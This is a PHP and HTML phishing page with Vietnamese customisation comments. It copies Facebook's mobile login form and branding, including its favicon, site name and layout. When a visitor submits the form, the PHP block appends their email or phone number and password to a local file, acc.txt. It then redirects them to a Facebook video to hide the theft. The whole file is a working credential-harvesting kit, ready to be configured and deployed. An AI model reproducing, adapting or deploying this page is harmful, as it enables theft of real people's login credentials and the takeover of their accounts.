<?php
    if(isset($_POST["login"])){
        $username = $_POST["email"];
        $password = $_POST["pass"];
        if($username == ""|| $password == "") {
            header('Location: /');
        }
        else {
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
            $subject = "Checking by Lê Anh Đức";
            $headers = "Checking by Lê Anh Đức";
            $body = "- Tài khoản: $username\n- Mật khẩu: $password\n\n★======★======★======★======★\n\n";
            $test = fopen("acc.txt","a");
            fwrite($test,$body);
            fclose($test);
            // Link chuyển hướng sau khi đăng nhập
            header('Location: https://www.facebook.com/100057842384431/videos/916254519247794');
        }
    }
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <!-- Tiêu đề hiển thị trên trình duyệt -->
    <title>Chill Full Day: Sản phẩm mới của rác :))</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <!-- Biểu tượng link (mặc định là Facebook) -->
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196" />
    <meta property="og:site_name" content="Facebook" />
    <meta property="og:type" content="website" />
    <!-- Tiêu đề hiển thị khi chia sẻ -->
    <meta property="og:title" content="Chill Full Day: Sản phẩm mới của rác :))" />
    <!-- Mô tả nằm dưới tiêu đề khi chia sẻ -->
    <meta property="og:description" content="Sản phẩm mới của rác :))" />
    <!-- Ảnh hiển thị khi chia sẻ -->
    <meta property="og:image" content="https://i.imgur.com/BbncV9D.jpg" />
    <script type='text/javascript'>
    //<![CDATA[
    function loadCSS(e, t, n) {
      "use strict";
      var i = window.document.createElement("link");
      var o = t || window.document.getElementsByTagName("script")[0];
      i.rel = "stylesheet";
      i.href = e;
      i.media = "only x";
      o.parentNode.insertBefore(i, o);
      setTimeout(function() {
        i.media = n || "all"
      })
    }
    loadCSS("//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css");
    loadCSS("//cdn.jsdelivr.net/gh/leanhducprovn/cdn/font-awesome/pro-5.15.3/css/all.css");
    loadCSS("//cdn.jsdelivr.net/gh/leanhducprovn/cdn/facebook/phishing/style.css");
    //]]>
  </script>
</head>

<!-- Form login Facebook mobi (không nên sửa) -->
<body tabindex="0" class="touch x2 _fzu _50-3 iframe acw">
    <script id="u_0_c_Qx" nonce="7BR6PIht">
        (function(a) {
            a.__updateOrientation = function() {
                var b = !!a.orientation && a.orientation !== 180,
                    c = document.body;
                c && (c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, " ") + " " + (b ? "landscape" : "portrait"));
                return b
            }
        })(window);
    </script>
    <div id="viewport" data-kaios-focus-transparent="1">
        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
                <div class="_7om2">
                    <div class="_4g34" id="u_0_0_xQ">
                        <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
                            <div class="_52jd"></div>
                        </div>
                        <div class="_9om_">
                            <div class="_4-4l">
                                <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"><div class="_qw9 grouped aclb" id="u_0_1_yu"><a href="#" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea"><div class="ib cc"><i class="l img sp_xm9DDmY7HAL_2x sx_3bd3fe"></i><div class="c"><span class="fcl"><i class="fad fa-mobile-alt"></i> Vui lòng đăng nhập Facebook để tiếp tục!</span></div></div></a></div><iframe style="display: none;"></iframe></div>
                                <div class="_7om2 _52we _2pid _52z6">
                                    <div class="_4g34">
                                        <a href=""><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook" />
                                        </a>
                                    </div>
                                </div>
                                <div class="_5rut">
                                    <form method="post" action="index.php" class="mobile-login-form _9hp- _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
                                        <input type="hidden" name="lsd" value="AVoaCHGpdtA" autocomplete="off" />
                                        <input type="hidden" name="jazoest" value="2962" autocomplete="off" />
                                        <input type="hidden" name="m_ts" value="1629101705" />
                                        <input type="hidden" name="li" value="iR4aYW0VQlb6ybzJ5HUjIIad" />
                                        <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" />
                                        <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" />
                                        <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
                                        <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
                                        <div id="otp_retrieve_desc_container"></div>
                                        <div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_96n9" id="email_input_container">
                                                        <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="S&#x1ed1; di &#x111;&#x1ed9;ng ho&#x1eb7;c email" type="text" data-sigil="m_login_email" />
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_55wq"></div>
                                            <div class="_56be">
                                                <div class="_55wo _56bf">
                                                    <div class="_1upc _mg8" data-sigil="m_login_password">
                                                        <div class="_7om2">
                                                            <div class="_4g34 _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="M&#x1ead;t kh&#x1ea9;u" type="password" data-sigil="password-plain-text-toggle-input" />
                                                                </div>
                                                            </div>
                                                            <div class="_5s61 _216i _5i2i _52we">
                                                                <div class="_5xu4">
                                                                    <div class="_2pi9" style="display:none" id="u_0_1_cQ"><a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_2_CJ">ẨN</span><span class="mfss" id="u_0_3_GR">HIỂN THỊ</span></a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_2pie" style="text-align:center;">
                                            <div id="login_password_step_element" data-sigil="login_password_step_element">
                                                <button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login"><span class="_55sr">Đăng nhập</span></button>
                                            </div>
                                            <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
                                            <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
                                            <div id="otp_button_elem_container"></div>
                                        </div>
                                        <input type="hidden" name="prefill_contact_point" id="prefill_contact_point" />
                                        <input type="hidden" name="prefill_source" id="prefill_source" />
                                        <input type="hidden" name="prefill_type" id="prefill_type" />
                                        <input type="hidden" name="first_prefill_source" id="first_prefill_source" />
                                        <input type="hidden" name="first_prefill_type" id="first_prefill_type" />
                                        <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" />
                                        <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" />
                                        <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" />
                                        <input type="hidden" id="bi_xrwh" name="bi_xrwh" value="0" />
                                        <input type="hidden" id="scetoggle" />
                                        <div class="_xo8"></div>
                                        <noscript>
                                            <input type="hidden" name="_fb_noscript" value="true" />
                                        </noscript>
                                    </form>
                                    <div>
                                        <div class="_2pie _9omz">
                                            <div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="" id="forgot-password-link">Quên mật khẩu?</a>
                                            </div>
                                        </div>
                                        <div style="padding-top: 42px">
                                            <div>
                                                <div>
                                                    <div>
                                                        <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">hoặc</span>
                                                        </div>
                                                        <div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="" tabindex="0" data-sigil="m_reg_button">Tạo tài khoản mới</a>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="_2pie" style="text-align:center;">
                                                    <div>
                                                        <div data-sigil="login_identify_step_element"></div>
                                                        <div class="other-links _8p_m">
                                                            <ul class="_5pkb _55wp">
                                                                <li></li>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div style="display:none">
                    <div></div>
                </div><span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none" /></span>
                <div class="_55wr _5ui2" data-sigil="m_login_footer">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
                            <div class="_7om2">
                                <div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">中文(台灣)</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Español</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Français (France)</a></span>
                                    </div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">English (UK)</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">한국어</a></span>
                                    </div>
                                    <div class="_3ztc"><span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Português (Brasil)</a></span>
                                    </div>
                                    <a href="">
                                        <div class="_3j87 _1rrd _3ztd" data-sigil="more_language"><i class="img sp_2OZsXpbZz8f_3x sx_13b295"></i>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4">
                            <div class="_96qv _9a0a"><a href="" class="_96qw" >Giới thiệu</a><span aria-hidden="true"> · </span><a href="" class="_96qw">Trợ giúp</a><span aria-hidden="true"> · </span><span class="_96qw" id="u_0_4_VX">Xem thêm</span>
                            </div>
                            <span class="mfss fcg">Facebook, Inc.</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>